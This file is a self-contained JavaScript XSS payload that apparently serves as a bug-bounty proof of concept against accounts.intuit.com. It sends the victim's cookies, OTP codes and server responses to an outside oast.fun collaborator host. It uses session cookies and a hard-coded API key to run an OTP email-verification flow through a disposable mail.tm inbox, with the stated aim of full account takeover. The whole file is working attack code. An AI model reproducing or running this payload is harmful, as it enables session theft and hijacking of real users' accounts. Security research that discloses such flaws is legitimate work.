(function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var M='https://api.mail.tm';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)
})
}

(new Image).src=O+'/p10-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var session=gc('ius_session');
var visitorId=gc('ivid');
var flowId=uid();

var iHeaders={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

var logs=[];
function log(msg){logs.push(msg);if(document.getElementById('lp'))document.getElementById('lp').textContent=logs.join('\n')}

document.body.innerHTML='<div style="font:13px monospace;background:#0a0a0a;color:#0f0;padding:25px;min-height:100vh">'
+'<div style="background:#1a0000;border:2px solid #f00;padding:15px;margin-bottom:15px;border-radius:8px">'
+'<h1 style="color:#f00;margin:0 0 5px;font-size:18px">XSS PoC — Automated Email Change</h1>'
+'<p style="color:#f88;margin:0;font-size:12px">accounts.intuit.com | via returnUrl javascript: URI</p></div>'
+'<div id="steps" style="margin-bottom:15px"></div>'
+'<div style="background:#111;border:1px solid #333;padding:10px;border-radius:8px;max-height:300px;overflow-y:auto">'
+'<pre id="lp" style="color:#888;margin:0;font-size:11px"></pre></div></div>';

var stepsEl=document.getElementById('steps');
function step(n,title,status,color){
var id='s'+n;
var el=document.getElementById(id);
var html='<span style="color:'+(color||'#ff0')+'">'+status+'</span> '+title;
if(el){el.innerHTML=html}
else{stepsEl.innerHTML+='<div id="'+id+'" style="background:#111;border:1px solid #333;padding:8px 12px;margin-bottom:5px;border-radius:5px">'+html+'</div>'}
}

log('session: '+session);
log('visitorId: '+visitorId);
log('flowId: '+flowId);

step(1,'Create temp email','[...]','#ff0');
step(2,'Send OTP to temp email','[waiting]','#666');
step(3,'Retrieve OTP from inbox','[waiting]','#666');
step(4,'Verify OTP & change email','[waiting]','#666');

fetch(M+'/domains')
.then(function(r){return r.json()})
.then(function(d){
var domain=d['hydra:member'][0].domain;
var login='poc'+Math.random().toString(36).substr(2,8);
var email=login+'@'+domain;
var pwd='XssPoc2027x!';
log('temp email: '+email);

return fetch(M+'/accounts',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({address:email,password:pwd})
}).then(function(r){
log('account create status: '+r.status);
return r.json()
}).then(function(){
return fetch(M+'/token',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({address:email,password:pwd})
}).then(function(r){return r.json()})
}).then(function(tok){
log('got mail token');
step(1,'Create temp email: <span style="color:#0f0">'+email+'</span>','[OK]','#0f0');
return{email:email,token:tok.token}
})
})
.then(function(mail){
step(2,'Send OTP to '+mail.email,'[...]','#ff0');
log('');
log('--- Intuit: initialize email ---');

return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:iHeaders,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:mail.email}),
credentials:'include'
}).then(function(r){
log('init status: '+r.status);
return r.text()
}).then(function(body){
log('init response: '+body);
(new Image).src=O+'/p10-init?r='+encodeURIComponent(body.substring(0,800));
var data;try{data=JSON.parse(body)}catch(e){}
if(data&&data.verifierSessionId){
step(2,'OTP sent to '+mail.email,'[OK]','#0f0');
log('verifierSessionId: '+data.verifierSessionId);
return{mail:mail,vsid:data.verifierSessionId}
}
throw new Error('no verifierSessionId: '+body.substring(0,200))
})
})
.then(function(ctx){
step(3,'Retrieve OTP from inbox','[polling...]','#ff0');
log('');
log('--- Polling for OTP email ---');

function poll(attempt){
log('poll attempt '+attempt);
return fetch(M+'/messages',{
headers:{'Authorization':'Bearer '+ctx.mail.token}
}).then(function(r){return r.json()})
.then(function(msgs){
var list=msgs['hydra:member']||[];
log('messages: '+list.length);
if(list.length>0){
return fetch(M+'/messages/'+list[0].id,{
headers:{'Authorization':'Bearer '+ctx.mail.token}
}).then(function(r){return r.json()})
}
if(attempt>=40){throw new Error('timeout waiting for OTP email after 40 polls')}
return new Promise(function(resolve){
setTimeout(function(){resolve(poll(attempt+1))},3000)
})
})
}

return poll(1).then(function(msg){
var body=(msg.text||'')+(msg.html||'');
log('email subject: '+(msg.subject||'none'));
log('email body length: '+body.length);
var otpMatch=body.match(/\b(\d{6})\b/);
if(otpMatch){
var otp=otpMatch[1];
log('EXTRACTED OTP: '+otp);
step(3,'OTP retrieved: <span style="color:#0f0;font-size:16px">'+otp+'</span>','[OK]','#0f0');
(new Image).src=O+'/p10-otp?otp='+otp;
return{otp:otp,vsid:ctx.vsid}
}
var digitMatches=body.match(/\d+/g);
log('all numbers found: '+JSON.stringify(digitMatches));
if(digitMatches){
for(var i=0;i<digitMatches.length;i++){
if(digitMatches[i].length>=4&&digitMatches[i].length<=8){
var otp2=digitMatches[i];
log('using number as OTP: '+otp2);
step(3,'OTP retrieved: '+otp2,'[OK]','#0f0');
return{otp:otp2,vsid:ctx.vsid}
}
}
}
throw new Error('could not extract OTP from email body')
})
})
.then(function(result){
step(4,'Verify OTP & change email','[...]','#ff0');
log('');
log('--- Intuit: verify OTP ---');
log('otp: '+result.otp);
log('vsid: '+result.vsid);

return fetch('/factors/v1/verifier/verify/email',{
method:'POST',
headers:iHeaders,
body:JSON.stringify({verifierSessionId:result.vsid,otp:result.otp}),
credentials:'include'
}).then(function(r){
log('verify status: '+r.status);
return r.text()
}).then(function(body){
log('verify response: '+body);
(new Image).src=O+'/p10-done?r='+encodeURIComponent(body.substring(0,800));
step(4,'Email changed!','[DONE]','#0f0');
stepsEl.innerHTML+='<div style="background:#001a00;border:2px solid #0f0;padding:15px;margin-top:10px;border-radius:8px;text-align:center">'
+'<h2 style="color:#0f0;margin:0">ACCOUNT EMAIL CHANGED VIA XSS</h2>'
+'<p style="color:#ff0;margin:5px 0 0">Full account takeover demonstrated</p></div>';
})
})
.catch(function(err){
log('ERROR: '+err.message);
(new Image).src=O+'/p10-fail?e='+encodeURIComponent(err.message);
stepsEl.innerHTML+='<div style="background:#1a0000;border:1px solid #f00;padding:10px;margin-top:10px;border-radius:8px">'
+'<p style="color:#f00">Error: '+err.message+'</p>'
+'<p style="color:#888">Check OAST and logs below for details</p></div>';
});
})();
